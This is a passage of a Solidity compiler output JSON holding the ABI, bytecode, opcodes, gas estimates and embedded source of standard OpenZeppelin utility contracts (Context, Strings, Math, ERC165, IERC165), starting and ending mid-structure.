contracts.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like contracts.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Context.sol\":\"Context\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/Strings.sol":{"Strings":{"abi":[],"devdoc":{"details":"String operations.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212204e54bbe508058abc16ba9ab18b15d60304dcfbec11b06791a21ce393f6c77ed564736f6c63430008070033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4E SLOAD 0xBB 0xE5 ADDMOD SDIV DUP11 0xBC AND 0xBA SWAP11 0xB1 DUP12 ISZERO 0xD6 SUB DIV 0xDC 0xFB 0xEC GT 0xB0 PUSH8 0x91A21CE393F6C77E 0xD5 PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ","sourceMap":"188:2065:7:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212204e54bbe508058abc16ba9ab18b15d60304dcfbec11b06791a21ce393f6c77ed564736f6c63430008070033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4E SLOAD 0xBB 0xE5 ADDMOD SDIV DUP11 0xBC AND 0xBA SWAP11 0xB1 DUP12 ISZERO 0xD6 SUB DIV 0xDC 0xFB 0xEC GT 0xB0 PUSH8 0x91A21CE393F6C77E 0xD5 PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ","sourceMap":"188:2065:7:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"toHexString(address)":"infinite","toHexString(uint256)":"infinite","toHexString(uint256,uint256)":"infinite","toString(uint256)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"String operations.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Strings.sol\":\"Strings\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Strings.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./math/Math.sol\\\";\\n\\n/**\\n * @dev String operations.\\n */\\nlibrary Strings {\\n    bytes16 private constant _SYMBOLS = \\\"0123456789abcdef\\\";\\n    uint8 private constant _ADDRESS_LENGTH = 20;\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                ptr := add(buffer, add(32, length))\\n            }\\n            while (true) {\\n                ptr--;\\n                /// @solidity memory-safe-assembly\\n                assembly {\\n                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = _SYMBOLS[value & 0xf];\\n            value >>= 4;\\n        }\\n        require(value == 0, \\\"Strings: hex length insufficient\\\");\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);\\n    }\\n}\\n\",\"keccak256\":\"0xa4d1d62251f8574deb032a35fc948386a9b4de74b812d4f545a1ac120486b48a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Down, // Toward negative infinity\\n        Up, // Toward infinity\\n        Zero // Toward zero\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds up instead\\n     * of rounding down.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\\n     * with further edits by Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator\\n    ) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod0 := mul(x, y)\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            require(denominator > prod1);\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.\\n            // See https://cs.stackexchange.com/q/138556/92363.\\n\\n            // Does not overflow because the denominator cannot be zero at this stage in the function.\\n            uint256 twos = denominator & (~denominator + 1);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works\\n            // in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator,\\n        Rounding rounding\\n    ) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \\u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \\u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10**64) {\\n                value /= 10**64;\\n                result += 64;\\n            }\\n            if (value >= 10**32) {\\n                value /= 10**32;\\n                result += 32;\\n            }\\n            if (value >= 10**16) {\\n                value /= 10**16;\\n                result += 16;\\n            }\\n            if (value >= 10**8) {\\n                value /= 10**8;\\n                result += 8;\\n            }\\n            if (value >= 10**4) {\\n                value /= 10**4;\\n                result += 4;\\n            }\\n            if (value >= 10**2) {\\n                value /= 10**2;\\n                result += 2;\\n            }\\n            if (value >= 10**1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xa1e8e83cd0087785df04ac79fb395d9f3684caeaf973d9e2c71caef723a3a5d6\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/introspection/ERC165.sol":{"ERC165":{"abi":[{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}],"devdoc":{"details":"Implementation of the {IERC165} interface. Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check for the additional interface id that will be supported. For example: ```solidity function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId); } ``` Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.","kind":"dev","methods":{"supportsInterface(bytes4)":{"details":"See {IERC165-supportsInterface}."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"supportsInterface(bytes4)":"01ffc9a7"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Implementation of the {IERC165} interface. Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check for the additional interface id that will be supported. For example: ```solidity function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId); } ``` Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\",\"kind\":\"dev\",\"methods\":{\"supportsInterface(bytes4)\":{\"details\":\"See {IERC165-supportsInterface}.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/introspection/ERC165.sol\":\"ERC165\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/introspection/ERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./IERC165.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC165} interface.\\n *\\n * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\\n * for the additional interface id that will be supported. For example:\\n *\\n * ```solidity\\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\\n * }\\n * ```\\n *\\n * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\\n */\\nabstract contract ERC165 is IERC165 {\\n    /**\\n     * @dev See {IERC165-supportsInterface}.\\n     */\\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n        return interfaceId == type(IERC165).interfaceId;\\n    }\\n}\\n\",\"keccak256\":\"0xd10975de010d89fd1c78dc5e8a9a7e7f496198085c151648f20cba166b32582b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/introspection/IERC165.sol":{"IERC165":{"abi":[{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}],"devdoc":{"details":"Interface of the ERC165 standard, as defined in the https://eips.ethereum.org/EIPS/eip-165[EIP]. Implementers can declare support of contract interfaces, which can then be queried by others ({ERC165Checker}). For an implementation, see {ERC165}.","kind":"dev","methods":{"supportsInterface(bytes4)":{"details":"Returns true if this contract implements the interface defined by `interfaceId`. See the corresponding https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] to learn more about how these ids are created. This function call must use less than 30 000 gas."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"supportsInterface(bytes4)":"01ffc9a7"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC165 standard, as defined in the https://eips.ethereum.org/EIPS/eip-165[EIP]. Implementers can declare support of contract interfaces, which can then be queried by others ({ERC165Checker}). For an implementation, see {ERC165}.\",\"kind\":\"dev\",\"methods\":{\"supportsInterface(bytes4)\":{\"details\":\"Returns true if this contract implements the interface defined by `interfaceId`. See the corresponding https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] to learn more about how these ids are created. This function call must use less than 30 000 gas.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":\"IERC165\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/math/Math.sol":{"Math":{"abi":[],"devdoc":{"details":"Standard math utilities missing in the Solidity language.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220adc8bca8ac6496ed9b3beb6b4c3a022305dad7b59bb328b83de1bdab7925719c64736f6c63430008070033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAD 0xC8 0xBC 0xA8 0xAC PUSH5 0x96ED9B3BEB PUSH12 0x4C3A022305DAD7B59BB328B8 RETURNDATASIZE 0xE1 0xBD 0xAB PUSH26 0x25719C64736F6C63430008070033000000000000000000000000 ","sourceMap":"202:12302:10:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220adc8bca8ac6496ed9b3beb6b4c3a022305dad7b59bb328b83de1bdab7925719c64736f6c63430008070033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAD 0xC8 0xBC 0xA8 0xAC PUSH5 0x96ED9B3BEB PUSH12 0x4C3A022305DAD7B59BB328B8 RETURNDATASIZE 0xE1 0xBD 0xAB PUSH26 0x25719C64736F6C63430008070033000000000000000000000000 ","sourceMap":"202:12302:10:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"average(uint256,uint256)":"infinite","ceilDiv(uint256,uint256)":"infinite","log10(uint256)":"infinite","log10(uint256,enum Math.Rounding)":"infinite","log2(uint256)":"infinite","log2(uint256,enum Math.Rounding)":"infinite","log256(uint256)":"infinite","log256(uint256,enum Math.Rounding)":"infinite","max(uint256,uint256)":"infinite","min(uint256,uint256)":"infinite","mulDiv(uint256,uint256,uint256)":"infinite","mulDiv(uint256,uint256,uint256,enum Math.Rounding)":"infinite","sqrt(uint256)":"infinite","sqrt(uint256,enum 